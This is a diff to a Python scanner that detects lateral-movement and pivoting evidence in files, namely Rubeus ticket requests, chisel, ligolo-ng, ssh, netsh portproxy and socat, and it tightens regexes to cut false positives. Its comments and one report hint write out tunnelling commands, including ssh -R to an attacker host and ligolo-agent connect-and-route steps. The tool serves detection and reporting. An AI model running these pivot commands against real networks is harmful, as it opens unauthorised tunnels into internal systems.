@@ -8912,7 +8912,15 @@ def _multiline_passes(path, report, store):
     if not filters.is_doc_file(path):
         _rubeus_seen = set()
         for _rt in _RUBEUS_ASKTGT_HDR.finditer(text[:65536]):
-            _win = text[_rt.start():_rt.start() + 2048]
+            _raw_win = text[_rt.start():_rt.start() + 2048]
+            # iter-309 audit-fix: cap the window at the next `Action:`
+            # header so a truncated block N cannot pair its UserName
+            # with block N+1's ServiceName / success line.
+            _next_hdr = re.search(
+                r'(?im)^\s*\[\*\]\s*Action\s*:',
+                _raw_win[len(_rt.group(0)):])
+            _win = (_raw_win[:len(_rt.group(0)) + _next_hdr.start()]
+                    if _next_hdr else _raw_win)
             _ok = _RUBEUS_ASKTGT_OK.search(_win)
             if not _ok:
                 continue
@@ -8993,7 +9001,16 @@ def _multiline_passes(path, report, store):
     if not filters.is_doc_file(path):
         _s4u_seen = set()
         for _s4 in _RUBEUS_S4U_HDR.finditer(text[:65536]):
-            _win = text[_s4.start():_s4.start() + 4096]
+            _raw_win = text[_s4.start():_s4.start() + 4096]
+            # iter-309 audit-fix: cap window at next `Action:` header
+            # to prevent a partial s4u block from pairing its
+            # `Impersonating` line with the following block's
+            # S4U2Self/Proxy success markers.
+            _next_hdr = re.search(
+                r'(?im)^\s*\[\*\]\s*Action\s*:',
+                _raw_win[len(_s4.group(0)):])
+            _win = (_raw_win[:len(_s4.group(0)) + _next_hdr.start()]
+                    if _next_hdr else _raw_win)
             _self_ok = _RUBEUS_S4U_SELF_OK.search(_win)
             _proxy_ok = _RUBEUS_S4U_PROXY_OK.search(_win)
             if not (_self_ok and _proxy_ok):
@@ -9009,13 +9026,16 @@ def _multiline_passes(path, report, store):
             _s4u_seen.add(_sig)
             # Severity: CRITICAL if impersonating Administrator /
             # da_ / domain admin canonical name; else HIGH.
+            # iter-309 audit-fix: anchor `administrator` /
+            # `domain admin` matches on word boundaries so
+            # `nonadministrator` / `sysadministrator2` don't elevate.
             _low_imp = _imp_user.lower()
-            _is_da = ("administrator" in _low_imp
+            _is_da = (bool(re.search(r'\badministrator\b', _low_imp))
                       or _low_imp.startswith("da_")
                       or _low_imp.startswith("da-")
                       or _low_imp.endswith("_da")
-                      or "domain admin" in _low_imp
-                      or "domainadmin" in _low_imp)
+                      or bool(re.search(r'\bdomain[_\s-]?admin\b',
+                                        _low_imp)))
             _sev = "CRITICAL" if _is_da else "HIGH"
             _imp_sh = _imp_user.replace("'", "'\\''")
             _spn_sh = _target_spn.replace("'", "'\\''")
@@ -9063,18 +9083,28 @@ def _multiline_passes(path, report, store):
     #   ssh -L 8080:10.20.30.40:80 user@jumphost
     #   ssh -R 4444:127.0.0.1:4444 user@attacker
     #   ssh -D 9050 user@jumphost
+    # iter-309 audit-fix: anchor chisel patterns to chisel's Go-log
+    # timestamp prefix `YYYY/MM/DD HH:MM:SS`. Without this anchor,
+    # nginx `server: Listening on http://...`, gunicorn/fiber startup
+    # banners, redis `client: Connected`, mqtt/postgres client
+    # Connected lines all fire fake PIVOT HIGHs.
     _CHISEL_SERVER = re.compile(
-        r'(?im)^[^\r\n]{0,80}\bserver\s*:\s*Listening\s+on\s+'
+        r'(?im)^\s*\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+'
+        r'server\s*:\s*Listening\s+on\s+'
         r'(https?://[^\s\r\n]{4,120})')
     _CHISEL_CLIENT = re.compile(
-        r'(?im)^[^\r\n]{0,80}\bclient\s*:\s*'
+        r'(?im)^\s*\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+'
+        r'client\s*:\s*'
         r'(?:session#\d+\s*:\s*)?Connected(?:\s*\(Latency\s+\d+ms\))?')
     _LIGOLO_AGENT_JOIN = re.compile(
         r'(?im)^[^\r\n]{0,80}Agent\s+joined\.?\s+'
         r'name\s*=\s*([\w.\-]{2,80})\s+remote\s*=\s*'
         r'([0-9a-f:.]{7,45}(?::\d{1,5})?)')
+    # iter-309 audit-fix: ligolo listener requires INFO[N] prefix (Go
+    # logrus format that ligolo-ng emits) to avoid nginx/socat FPs.
     _LIGOLO_LISTEN = re.compile(
-        r'(?im)^[^\r\n]{0,80}Listening\s+on\s+([0-9.]{7,15}:\d{2,5})')
+        r'(?im)^\s*INFO\[\s*\d+\s*\]\s+Listening\s+on\s+'
+        r'([0-9.]{7,15}:\d{2,5})')
     _SSH_LFORWARD = re.compile(
         r'(?im)\bssh\s+(?:-\w+\s+)*(-[LRD])\s+'
         r'(\d{2,5}(?::[\w.\-]{2,80}:\d{2,5})?)\s+[^\r\n]{1,120}')
@@ -9103,12 +9133,15 @@ def _multiline_passes(path, report, store):
                                    meta={"tool": "chisel",
                                          "role": "server",
                                          "endpoint": _url}))
-        # Chisel client Connected
+        # Chisel client Connected. iter-309 audit-fix: dedupe per file
+        # (one hit) — timestamp-anchored regex already prevents FP spam
+        # from redis/mqtt logs, and multiple Chisel Connected lines in
+        # the same file are reconnect noise for the same session.
+        _chisel_cli_emitted = False
         for _cc in _CHISEL_CLIENT.finditer(text[:65536]):
-            _sig = ("chisel-cli", _cc.start() // 200)  # cluster by position
-            if _sig in _pivot_seen:
-                continue
-            _pivot_seen.add(_sig)
+            if _chisel_cli_emitted:
+                break
+            _chisel_cli_emitted = True
             report.add("HIGH", "PIVOT", path, _ln(_cc),
                        f"Chisel client CONNECTED - reverse tunnel "
                        f"active into internal network",
@@ -9123,6 +9156,30 @@ def _multiline_passes(path, report, store):
                                    meta={"tool": "chisel",
                                          "role": "client",
                                          "status": "connected"}))
+        # iter-309 audit-fix: Ligolo-ng proxy listener dispatcher
+        # (regex was compiled but never used). Attacker-side ligolo
+        # proxy startup emits `INFO[0000] Listening on 0.0.0.0:11601`.
+        _ligolo_listen_emitted = False
+        for _ll in _LIGOLO_LISTEN.finditer(text[:65536]):
+            if _ligolo_listen_emitted:
+                break
+            _ligolo_listen_emitted = True
+            _endpoint = _ll.group(1).strip()
+            report.add("HIGH", "PIVOT", path, _ln(_ll),
+                       f"Ligolo-ng proxy listening on {_endpoint} - "
+                       f"pivot tunnel endpoint established",
+                       hint=(f"attacker-side ligolo proxy  |  "
+                             f"compromised host runs: ./ligolo-agent -"
+                             f"connect <attacker>:{_endpoint.split(':')[-1]} -ignore-cert"
+                             f"  |  then in proxy: > session 1; > "
+                             f"start --tun ligolo; > ip route add "
+                             f"<cidr> dev ligolo"))
+            if store is not None:
+                store.add(Evidence(kind="pivot_landed",
+                                   source=path, line=_ln(_ll),
+                                   meta={"tool": "ligolo-ng",
+                                         "role": "proxy_listener",
+                                         "endpoint": _endpoint}))
         # Ligolo-ng Agent joined (proxy side, most valuable)
         for _lj in _LIGOLO_AGENT_JOIN.finditer(text[:65536]):
             _agent_name = _lj.group(1).strip()
@@ -9194,20 +9251,31 @@ def _multiline_passes(path, report, store):
     # Socat listener-forward:
     #   socat TCP4-LISTEN:8080,fork TCP4:10.20.30.40:445
     #   socat TCP-LISTEN:1234,fork,reuseaddr TCP:internal:22
-    _NETSH_PORTPROXY_ADD = re.compile(
+    # iter-309 audit-fix: netsh accepts args in ANY order. Match the
+    # `add v4tov4` command line as a whole (up to 300 chars) then
+    # extract each field independently — the previous fixed-order
+    # regex silently missed `connectaddress=X listenport=Y ...`.
+    _NETSH_PORTPROXY_LINE = re.compile(
         r'(?i)\bnetsh\s+(?:interface\s+)?portproxy\s+add\s+v4tov4'
-        r'[^\r\n]*?listenport\s*=\s*(\d{1,5})'
-        r'[^\r\n]*?connectport\s*=\s*(\d{1,5})'
-        r'[^\r\n]*?connectaddress\s*=\s*([\w.\-:]{3,80})')
+        r'[^\r\n]{0,300}')
+    _NETSH_LP = re.compile(r'(?i)\blistenport\s*=\s*(\d{1,5})\b')
+    _NETSH_CP = re.compile(r'(?i)\bconnectport\s*=\s*(\d{1,5})\b')
+    _NETSH_CA = re.compile(r'(?i)\bconnectaddress\s*=\s*([\w.\-:]{3,80})')
     _SOCAT_LISTEN = re.compile(
         r'(?i)\bsocat\s+TCP4?-LISTEN\s*:\s*(\d{1,5})'
         r'[^\r\n]*?TCP4?\s*:\s*([\w.\-:]{3,80})\s*:\s*(\d{1,5})')
     if not filters.is_doc_file(path):
         _pivot2_seen = set()
-        for _np in _NETSH_PORTPROXY_ADD.finditer(text[:65536]):
-            _lp = _np.group(1)
-            _cp = _np.group(2)
-            _ca = _np.group(3)
+        for _np in _NETSH_PORTPROXY_LINE.finditer(text[:65536]):
+            _line = _np.group(0)
+            _lp_m = _NETSH_LP.search(_line)
+            _cp_m = _NETSH_CP.search(_line)
+            _ca_m = _NETSH_CA.search(_line)
+            if not (_lp_m and _cp_m and _ca_m):
+                continue
+            _lp = _lp_m.group(1)
+            _cp = _cp_m.group(1)
+            _ca = _ca_m.group(1)
             _sig = ("netsh-pp", _lp, _cp, _ca.lower())
             if _sig in _pivot2_seen:
                 continue
